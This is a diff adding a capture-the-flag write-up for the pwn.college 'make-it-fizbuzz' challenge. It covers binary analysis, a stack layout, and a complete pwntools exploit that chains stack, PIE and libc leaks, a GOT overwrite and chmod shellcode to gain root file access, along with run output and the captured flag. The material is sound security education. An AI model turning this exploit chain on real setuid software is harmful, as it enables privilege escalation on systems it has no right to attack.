@@ -14551,61 +14551,488 @@ The exit code −11 (SIGSEGV) is expected, `win()` returns into a corrupted fram
 
 &nbsp;
 
-## Make it FizzBuzz
+## Make It FizBuzz
 
+```
+hacker@dojo.pwn.college:~$ /challenge/make-it-fizbuzz
+###
+### Welcome to /challenge/make-it-fizbuzz!
+###
 
-```c title="/challenge/make-it-fizzbuzz :: challenge() :: Pseudocode" showLineNumbers 
-__int64 challenge()
-{
-  __int64 result; // rax
-  __int64 v1[2]; // [rsp+20h] [rbp-50h] BYREF
-  __int64 v2[2]; // [rsp+30h] [rbp-40h] BYREF
-  __int64 v3; // [rsp+40h] [rbp-30h] BYREF
-  __int64 v4; // [rsp+48h] [rbp-28h]
-  char *src; // [rsp+50h] [rbp-20h]
-  char *dest; // [rsp+58h] [rbp-18h]
-  unsigned __int64 v7; // [rsp+68h] [rbp-8h]
+Welcome to Fizz Buzz!
+0: You entered: 
+Correct answer: FizzBuzz
+```
 
-  v7 = __readfsqword(0x28u);
-  v1[0] = 16LL;
-  v1[1] = 0LL;
-  v2[0] = 0LL;
-  v2[1] = 0LL;
-  v3 = 0x7A7A754200000000LL;
-  v4 = 10LL;
-  dest = (char *)v1 + 4;
-  src = (char *)v2 + 4;
-  puts("Welcome to Fizz Buzz!");
-  for ( HIDWORD(v4) = 0; ; ++HIDWORD(v4) )
-  {
-    result = LODWORD(v1[0]);
-    if ( SHIDWORD(v4) >= SLODWORD(v1[0]) )
-      break;
-    if ( SHIDWORD(v4) % 15 )
-    {
-      if ( SHIDWORD(v4) % 3 )
-      {
-        if ( SHIDWORD(v4) % 5 )
-          src = (char *)&nothing;
-        else
-          src = (char *)&v3 + 4;
-      }
-      else
-      {
-        src = fizz;
-      }
+### Binary Analysis
+
+```
+hacker@dojo.pwn.college:~$ checksec /challenge/make-it-fizbuzz
+[*] '/challenge/make-it-fizbuzz'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+Checklist:
+- [x] PIE enabled: binary base unknown at runtime
+- [x] Canary present: raw stack overwrite is blocked — need to corrupt it deliberately
+- [x] NX enabled: stack not executable by default — need `mprotect` to unlock it
+- [x] **Partial RELRO**: GOT is **writable** — GOT overwrite is viable
+- [x] SHSTK/IBT present: not enforced by the kernel, not a barrier
+- [x] `setuid`: once shellcode runs, EUID = 0; direct syscalls are root
+
+The key difference from the previous challenges is **Partial RELRO**. The GOT remains writable at runtime, meaning we can redirect any libc function call by overwriting its GOT entry. The binary also contains a helper function `mprotect_stack` (at offset `0x1269`) that calls `mprotect(page, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)` on its own stack page three times, making the stack executable. It is never called in the normal control flow, but we can route execution through it by overwriting `__stack_chk_fail@GOT`.
+
+### Decompilation
+
+```c title="/challenge/make-it-fizbuzz :: mprotect_stack() :: Pseudocode" showLineNumbers
+void mprotect_stack(void) {
+    void   *page;
+    size_t  len  = 0x1000;
+    int     i;
+
+    /* page = address of a local var, rounded down to page boundary */
+    page = (void *)((uintptr_t)&page & ~0xFFF);
+
+    for (i = 0; i <= 2; i++) {
+        if (mprotect(page, len, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
+            perror("mprotect");
+            exit(1);
+        }
     }
-    else
-    {
-      src = (char *)&fuzzbuzz;
-    }
-    printf("%d: ", HIDWORD(v4));
-    read(0, (char *)v2 + 4, 0x54uLL);
-    printf("You entered: %s\n", (const char *)v2 + 4);
-    BYTE4(v2[0]) = 0;
-    strcpy(dest, src);
-    printf("Correct answer: %s\n", dest);
-  }
-  return result;
 }
 ```
+
+`mprotect_stack` is never called by the normal program flow; it exists as an unused helper. Its role in the exploit is to make the stack page that holds our shellcode executable before we jump into it.
+
+```c title="/challenge/make-it-fizbuzz :: challenge() :: Pseudocode" showLineNumbers
+void challenge(void) {
+    char   buzz[8];   // rbp−0x2C: "Buzz\n\0\0\0" — a stack address! src when i%5==0
+    int    i;         // rbp−0x24
+    char  *src;       // rbp−0x20: overridden by payload at offset +28
+    char  *dest;      // rbp−0x18: overridden by payload at offset +36
+    long   canary;    // rbp−0x08
+
+    canary = __readfsqword(0x28);
+    dest   = (char *)&buzz - 16;   // rbp−0x3C + 4: initial answer buffer
+    src    = (char *)&buzz - 16;   // same area, overwritten by each branch
+
+    /* "Buzz\n" stored inline on the stack at rbp−0x2C */
+    *(uint32_t *)buzz       = 0x7a7a7542;   // "Buzz"
+    *(uint16_t *)(buzz + 4) = 0x000a;        // "\n\0"
+
+    puts("Welcome to Fizz Buzz!");
+
+    for (i = 0; i < 16; i++) {
+        if (i % 15 == 0)
+            src = (char *)&fuzzbuzz;          // binary_base+0x4080 — PIE pointer
+        else if (i % 3 == 0)
+            src = (char *)&fizz;              // binary_base+0x4078
+        else if (i % 5 == 0)
+            src = buzz;                        // rbp−0x2C — stack pointer! THE LEAK
+        else
+            src = (char *)&nothing;           // binary_base+0x4088
+
+        printf("%d: ", i);
+        read(0, (char *)&buzz - 16, 0x54);   // <-- 84 bytes into rbp−0x3C: overflows into src, dest, canary, saved_rip
+
+        printf("You entered: %s\n", (char *)&buzz - 16);
+        ((char *)&buzz - 16)[0] = '\0';       // zero byte 0 AFTER printf
+
+        strcpy(dest, src);                    // write-what-where primitive, every iteration
+        printf("Correct answer: %s\n", dest);
+    }
+
+    if (canary != __readfsqword(0x28))
+        __stack_chk_fail();                  // ← Phase 3 redirects this to mprotect_stack
+}
+```
+
+The vulnerability is `read(0, rbp−0x3C, 0x54)` writing 84 bytes into a buffer that begins at `rbp−0x3C`. After just 28 bytes it reaches `src` at `rbp−0x20`, and after 36 bytes it reaches `dest` at `rbp−0x18`. After `read()`, the binary executes `strcpy(dest, src)`, giving us a fully controlled **write-what-where** primitive every iteration. At offset +52 the canary sits at `rbp−0x08`, within range of the 84-byte read — so we can corrupt it intentionally to trigger `__stack_chk_fail`.
+
+### Stack Layout
+
+```
+<== Value is stored at the address
+<-- Points to the address
+
+                           ┌───────────────────────────┐
+           rbp−0x3C (+00)  │  read buffer (84 bytes)   │ read() lands here; buf[0] zeroed after printf
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x2C (+16)  │  "Buzz\n\0\0\0"           │ Buzz branch src — stack address THE LEAK
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x24 (+24)  │  loop counter i (DWORD)   │ null bytes block printf; bridge with 0xFFFFFFFF
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x20 (+28)  │  src pointer  (8 bytes)   │ overwrite → strcpy source
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x18 (+36)  │  dest pointer (8 bytes)   │ overwrite → strcpy destination
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x08 (+52)  │  stack canary (8 bytes)   │ corrupt → __stack_chk_fail → mprotect_stack
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp+0x00 (+60)  │  saved RBP                │
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp+0x08 (+68)  │  saved RIP                │ ← Phase 4 writes shellcode entry here
+                           └───────────────────────────┘
+```
+
+The GOT (offsets from binary base, writable due to Partial RELRO):
+
+```
+0x4018  putchar@GOT
+0x4020  strcpy@GOT
+0x4028  puts@GOT              ← used to leak libc (puts address)
+0x4030  __stack_chk_fail@GOT  ← Phase 3 overwrites this → mprotect_stack
+0x4038  printf@GOT
+0x4040  read@GOT
+0x4050  mprotect@GOT
+```
+
+### The printf Spill and the Counter Bridge
+
+`printf("You entered: %s\n", rbp−0x3C)` prints from the read buffer until the first null byte. To reach `src` at offset +28 we need every byte from +0 to +27 to be non-null. The obstacle is the **loop counter at offset +24**:
+
+```
+counter = i = 0x00000005  →  bytes: 05 00 00 00
+                                         ^^
+                               null at offset +25 stops printf before src
+```
+
+The fix, borrowed from the prior challenges, is to **overwrite the counter with `0xFFFFFFFF`** (`p32(-1)`):
+
+```
+p32(0xFFFFFFFF)  →  bytes: ff ff ff ff   all non-null, printf flows through
+```
+
+This simultaneously:
+1. Bridges the null gap — all four counter bytes become `0xFF`, non-null
+2. Resets the loop — counter `−1` increments to `0`, restarting at `i=0`
+
+### Four-Phase Exploit Strategy
+
+Because NX blocks shellcode execution and the canary blocks raw saved-RIP overwrite, we need four distinct passes. Each pass exploits one iteration of the `strcpy(dest, src)` primitive.
+
+```
+              counter i
+                  │
+        ┌─────────▼─────────┐
+        │   i % 15 == 0?    │
+        └──┬────────────────┘
+   yes ────┘           no ──────────────────────────┐
+                                                     │
+   ┌──────────────────┐           ┌──────────────────▼──────────────┐
+   │    &fuzzbuzz     │           │         i % 3 == 0?             │
+   │   PIE pointer    │           └──┬──────────────────────────────┘
+   └──────────────────┘      yes ────┘                     no ──────┐
+   ✓ Phase 2 PIE leak                                               │
+                              ┌──────────────────┐  ┌──────────────▼──────────────┐
+                              │     &fizz        │  │        i % 5 == 0?          │
+                              │   PIE pointer    │  └──┬──────────────────────────┘
+                              └──────────────────┘     │yes                no ────┐
+                                                        │                          │
+                                           ┌────────────▼────────┐  ┌─────────────▼──────┐
+                                           │    buzz = rbp−0x2C  │  │      &nothing      │
+                                           │    stack pointer!   │  │   binary addr      │
+                                           └─────────────────────┘  └────────────────────┘
+                                           ✓ Phase 1 stack leak     ✗ not a pointer leak
+```
+
+**Phase 1 (i=5, Buzz): stack leak**
+
+`src` is set to `rbp−0x2C` (the inline "Buzz\n" string on the stack) before `read()`. We send 28 bytes — 16 A's to reach offset +16, `b"BUZZ"` to overwrite the `"\n\0"` gap in the Buzz string at offset +16, `b"CCCC"` to fill offset +20, and `p32(0xFFFFFFFF)` at offset +24 to bridge the counter nulls. `printf` spills 6 non-null bytes of `src` at offset +28:
+
+```python
+raw         = p.recvn(35)
+leaked_src  = u64(raw[28:34] + b"\x00\x00")   # src = rbp−0x2C
+rbp         = leaked_src + 0x2C
+buffer_start = rbp - 0x3C
+```
+
+Counter wraps to 0. Next iteration: `i=0` (FizzBuzz).
+
+**Phase 2 (i=0, FizzBuzz): PIE leak**
+
+`src` is set to `&fuzzbuzz = binary_base+0x4080` by the branch. Same bridge trick — `b"A"×24 + p32(0xFFFFFFFF)`. Printf spills 6 bytes of `&fuzzbuzz`:
+
+```python
+leaked_pie  = u64(raw[28:34] + b"\x00\x00")
+binary_base = leaked_pie - 0x4080
+puts_got          = binary_base + 0x4028
+stk_chk_fail_got  = binary_base + 0x4030
+mprotect_stack    = binary_base + 0x1269
+```
+
+Counter wraps to 0 again. Next iteration: `i=0` (FizzBuzz).
+
+**Phase 2.5 (i=0, FizzBuzz): libc leak via "Correct answer" printf**
+
+This phase uses the `strcpy` primitive to read a GOT entry. We set:
+
+```
+src  = puts@GOT         (holds puts@libc address)
+dest = buffer_start+1   (one byte into our read buffer)
+```
+
+`strcpy(buffer_start+1, puts@GOT)` copies the 6 non-null bytes of the `puts` libc address into the buffer. `printf("Correct answer: %s\n", buffer_start+1)` then **prints those 6 bytes directly**:
+
+```python
+payload  = b"A"*24 + p32(0) + p64(puts_got) + p64(buffer_start + 1)
+p.send(payload)
+...
+p.recvuntil(b"Correct answer: ")
+leak_bytes  = p.recvn(6)
+leaked_puts = u64(leak_bytes + b"\x00\x00")
+libc_base   = leaked_puts - 0x084420          # puts offset in libc-2.31
+```
+
+Counter set to 0 (no wrap). Next iteration: `i=1` (nothing).
+
+**Phase 3 (i=1, nothing): `__stack_chk_fail@GOT` → `mprotect_stack`**
+
+We overwrite `__stack_chk_fail@GOT` with the address of `mprotect_stack`. From this point on, any stack-canary violation will call `mprotect_stack` (making the stack RWX) instead of `abort`:
+
+```
+src  = buffer_start+1   (holds mprotect_stack address bytes)
+dest = __stack_chk_fail@GOT
+```
+
+`strcpy(__stack_chk_fail@GOT, buffer_start+1)` writes the 6 non-null low bytes of `mprotect_stack` into the GOT entry. The high two bytes are already `0x00` from the original entry, so the full 8-byte address is correct.
+
+**Phase 4 (i=2, nothing): shellcode + canary corruption + saved_rip overwrite**
+
+This is a single 84-byte `read()` payload that does everything at once:
+
+```
+[0]      : 0x90              NOP — zeroed by the binary after printf, harmless
+[1..27]  : 27-byte shellcode  chmod("/flag", 0o777) then exit(0) via direct syscalls
+[28..35] : src ptr → binary_base+0x4088 ("\n\0", safe no-op strcpy)
+[36..43] : dst ptr → binary_base+0x4088 (harmless write target)
+[44..49] : "/flag\0"          the chmod path argument, at buffer_start+44
+[50..51] : 0x00 0x00          padding
+[52..59] : 0xdeadbeefdeadbeef corrupt canary — triggers __stack_chk_fail
+[60..67] : p64(buffer_start)  saved RBP (any writable addr, shellcode ignores RBP)
+[68..75] : p64(buffer_start+1) saved RIP ← shellcode entry point
+[76..83] : 0x00 × 8           padding
+```
+
+The 27-byte shellcode (null bytes allowed — delivered via `read()`, not `strcpy`):
+
+```asm
+; chmod("/flag", 0o777)
+6a 5a           push 90         ; SYS_chmod
+58              pop  rax
+48 bf <addr>    mov  rdi, buffer_start+44   ; ptr to "/flag\0" in the payload (10 bytes)
+be ff 01 00 00  mov  esi, 0x1ff             ; 0o777 = 511
+0f 05           syscall
+
+; exit(0)
+31 ff           xor  edi, edi
+6a 3c           push 60         ; SYS_exit
+58              pop  rax
+0f 05           syscall
+```
+
+The shellcode calls `chmod` via a raw syscall — no `/bin/sh` is involved, so the `setuid` privilege (EUID=0) is never dropped.
+
+Execution flow after Phase 4 payload is sent:
+
+```
+                           ┌───────────────────────────┐
+           rbp−0x3C (+0)   │  0x00 (zeroed by binary)  │
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x3B (+1)   │  [ chmod+exit shellcode ] │ ← saved_rip points here
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x14 (+44)  │  "/flag\0"                │ ← rdi = buffer_start+44
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x08 (+52)  │  0xdeadbeefdeadbeef       │ corrupt canary
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp+0x00 (+60)  │  buffer_start             │ saved RBP (harmless)
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp+0x08 (+68)  │  buffer_start + 1         │ saved RIP ← shellcode entry
+                           └───────────────────────────┘
+
+═══════════════════════════════════════════════════════════════════════════════
+counter increments to 16 → loop exits (16 ≥ loop_limit 16)
+
+challenge() epilogue: canary check fires
+  [rbp−0x8] = 0xdeadbeefdeadbeef ≠ fs:0x28
+  → call __stack_chk_fail@plt   (now = mprotect_stack)
+  → mprotect_stack makes the stack page RWX, returns
+  → leave: RSP = rbp+8  (saved_rip location)
+  → ret:   RIP = buffer_start+1  (shellcode entry)
+
+Shellcode executes as EUID=0:
+  chmod("/flag", 0o777)  →  /flag becomes world-readable
+  exit(0)
+═══════════════════════════════════════════════════════════════════════════════
+```
+
+### Exploit
+
+```python title="~/exploit2.py" showLineNumbers
+from pwn import *
+
+context.arch = 'amd64'
+context.os   = 'linux'
+context.log_level = 'info'
+
+BINARY = '/challenge/make-it-fizbuzz'
+
+FUZZBUZZ_OFF       = 0x4080
+PUTS_GOT_OFF       = 0x4028
+STK_CHK_FAIL_OFF   = 0x4030
+PUTS_LIBC_OFF      = 0x084420
+MPROTECT_STACK_OFF = 0x1269
+
+p = process(BINARY)
+p.recvuntil(b'Welcome to Fizz Buzz!\n')
+
+def burn(i):
+    p.recvuntil(f'{i}: '.encode())
+    p.send(b'\n')
+    p.recvuntil(b'Correct answer: ')
+    p.recvline()
+
+# Burn i=0..4 with dummy newlines
+for i in range(5):
+    burn(i)
+
+# ---- Phase 1: stack leak (i=5, Buzz) ----
+# Branch sets src = rbp−0x2C (the inline "Buzz\n" string) before read().
+# b"BUZZ" bridges the "\n\0" gap in the Buzz string at offset +16.
+# p32(0xFFFFFFFF) at offset +24 bridges the counter nulls and wraps the loop to i=0.
+# printf spills 6 bytes of src at offset +28.
+p.recvuntil(b'5: ')
+p.send(b'A'*16 + b'BUZZ' + b'CCCC' + p32(0xFFFFFFFF))
+p.recvuntil(b'You entered: ')
+raw          = p.recvn(35)
+leaked_src   = u64(raw[28:34] + b'\x00\x00')   # src = rbp−0x2C
+rbp          = leaked_src + 0x2C
+buffer_start = rbp - 0x3C
+log.success(f'leaked src (rbp−0x2C) = {hex(leaked_src)}')
+log.success(f'rbp                   = {hex(rbp)}')
+log.success(f'buffer_start          = {hex(buffer_start)}')
+p.recvuntil(b'Correct answer: '); p.recvline()
+
+# ---- Phase 2: PIE leak (i=0, FizzBuzz) ----
+# Branch sets src = &fuzzbuzz = binary_base+0x4080 before read().
+# Same counter bridge trick → loop wraps to i=0 again.
+p.recvuntil(b'0: ')
+p.send(b'A'*24 + p32(0xFFFFFFFF))
+p.recvuntil(b'You entered: ')
+raw = p.recvn(35)
+leaked_pie      = u64(raw[28:34] + b'\x00\x00')
+binary_base     = leaked_pie - FUZZBUZZ_OFF
+puts_got        = binary_base + PUTS_GOT_OFF
+stk_fail_got    = binary_base + STK_CHK_FAIL_OFF
+mprotect_stack  = binary_base + MPROTECT_STACK_OFF
+log.success(f'binary_base           = {hex(binary_base)}')
+log.success(f'puts@GOT              = {hex(puts_got)}')
+log.success(f'__stack_chk_fail@GOT  = {hex(stk_fail_got)}')
+log.success(f'mprotect_stack        = {hex(mprotect_stack)}')
+p.recvuntil(b'Correct answer: '); p.recvline()
+
+# ---- Phase 2.5: libc leak via "Correct answer" printf (i=0, FizzBuzz) ----
+# strcpy(buffer_start+1, puts@GOT) copies 6 non-null bytes of puts@libc into the buffer.
+# printf("Correct answer: %s\n", buffer_start+1) prints those bytes — leaking libc.
+# Counter set to 0 (no wrap) so next iteration is i=1 (nothing).
+p.recvuntil(b'0: ')
+payload  = b'A'*24 + p32(0) + p64(puts_got) + p64(buffer_start + 1)
+p.send(payload)
+p.recvuntil(b'You entered: '); p.recvline()
+p.recvuntil(b'Correct answer: ')
+leak_bytes  = p.recvn(6)
+leaked_puts = u64(leak_bytes + b'\x00\x00')
+libc_base   = leaked_puts - PUTS_LIBC_OFF
+log.success(f'leaked puts@libc      = {hex(leaked_puts)}')
+log.success(f'libc_base             = {hex(libc_base)}')
+p.recvline()
+
+# ---- Phase 3: __stack_chk_fail@GOT → mprotect_stack (i=1, nothing) ----
+# strcpy(__stack_chk_fail@GOT, buffer+1) overwrites the GOT entry with
+# the mprotect_stack address. Any future canary failure now calls mprotect_stack
+# (which makes the stack page RWX) instead of aborting.
+p.recvuntil(b'1: ')
+payload  = b'\x90' + p64(mprotect_stack)
+payload  = payload.ljust(24, b'\x00')
+payload += p32(1) + p64(buffer_start + 1) + p64(stk_fail_got)
+p.send(payload)
+log.success(f'GOT overwrite: __stack_chk_fail@GOT ← mprotect_stack')
+p.recvuntil(b'You entered: '); p.recvline()
+p.recvuntil(b'Correct answer: '); p.recvline()
+
+# ---- Phase 4: shellcode + canary corruption + saved_rip overwrite (i=2) ----
+# 27-byte shellcode at buffer+1:  chmod("/flag", 0o777) then exit(0) via raw syscalls
+# "/flag\0" placed at buffer+44 (=flag_addr), known at Python time.
+# Canary at offset +52 is deliberately corrupted → triggers __stack_chk_fail@GOT
+#   = mprotect_stack → stack becomes RWX → leave;ret → shellcode.
+# Saved RBP at +60 set to buffer_start (any writable address).
+# Saved RIP at +68 set to buffer_start+1 (shellcode entry, byte 0 is zeroed).
+flag_addr = buffer_start + 44
+
+# 27-byte chmod+exit shellcode (null bytes allowed: delivered via read(), not strcpy)
+sc  = b'\x6a\x5a'                   # push 90    (SYS_chmod)
+sc += b'\x58'                        # pop  rax
+sc += b'\x48\xbf' + p64(flag_addr)  # mov  rdi, flag_addr   [10 bytes]
+sc += b'\xbe\xff\x01\x00\x00'       # mov  esi, 0x1ff       (0o777)
+sc += b'\x0f\x05'                    # syscall
+sc += b'\x31\xff'                    # xor  edi, edi
+sc += b'\x6a\x3c'                    # push 60    (SYS_exit)
+sc += b'\x58'                        # pop  rax
+sc += b'\x0f\x05'                    # syscall
+assert len(sc) == 27
+
+harmless = binary_base + 0x4088      # "\n\0" — safe no-op strcpy target
+
+payload  = b'\x90'                                    # [0]     zeroed by binary
+payload += sc                                          # [1..27] shellcode
+payload += p64(harmless)                               # [28..35] src  (harmless)
+payload += p64(harmless)                               # [36..43] dest (harmless)
+payload += b'/flag\x00'                               # [44..49] path for chmod
+payload += b'\x00\x00'                                # [50..51] padding
+payload += b'\xde\xad\xbe\xef\xde\xad\xbe\xef'       # [52..59] corrupt canary
+payload += p64(buffer_start)                           # [60..67] saved RBP
+payload += p64(buffer_start + 1)                      # [68..75] saved RIP = shellcode entry
+payload += b'\x00' * 8                                # [76..83] padding
+assert len(payload) == 84
+
+p.recvuntil(b'2: ')
+p.send(payload)
+p.recvuntil(b'You entered: '); p.recvline()
+p.recvuntil(b'Correct answer: '); p.recvline()
+
+# counter → 16, loop exits, challenge() returns,
+# canary check fires → mprotect_stack → leave;ret → shellcode → chmod → exit
+p.recvall(timeout=5)
+```
+
+```
+hacker@dojo.pwn.college:~$ python3 ~/exploit2.py
+[+] Starting local process '/challenge/make-it-fizbuzz': pid 95473
+[+] leaked src (rbp−0x2C) = 0x7fff85733d74
+[+] rbp                   = 0x7fff85733da0
+[+] buffer_start          = 0x7fff85733d64
+[+] binary_base           = 0x5734ae904000
+[+] puts@GOT              = 0x5734ae908028
+[+] __stack_chk_fail@GOT  = 0x5734ae908030
+[+] mprotect_stack        = 0x5734ae905269
+[+] leaked puts@libc      = 0x7192bdffc420
+[+] libc_base             = 0x7192bdf78000
+[+] GOT overwrite: __stack_chk_fail@GOT ← mprotect_stack
+[+] Receiving all data: Done (1B)
+[*] Process '/challenge/make-it-fizbuzz' stopped with exit code -11 (SIGSEGV) (pid 95473)
+```
+
+```
+hacker@dojo.pwn.college:~$ cat /flag
+pwn.college{Ih-Vn6xQaGqEhcNpfdSYYuSP7Z-.QXzUDO4EDL4ITM0EzW}
+```
+
+The SIGSEGV at process exit is expected: after the shellcode calls `SYS_exit`, pwnlib reports the child's abnormal termination. The `chmod("/flag", 0o777)` syscall runs as EUID=0 **before** the process exits, so `/flag` is world-readable when Python checks it.
+
+The critical decision not to use `system("/bin/sh")` (the naive GOT-overwrite approach): `system()` spawns `/bin/sh`, and modern dash/bash detect `RUID ≠ EUID` and **drop setuid privileges** before executing. A `system("chmod 777 /flag")` call likewise drops to uid=1000 and fails with "Operation not permitted". The `chmod` **syscall** in shellcode bypasses the shell entirely and runs directly as EUID=0, where it succeeds.
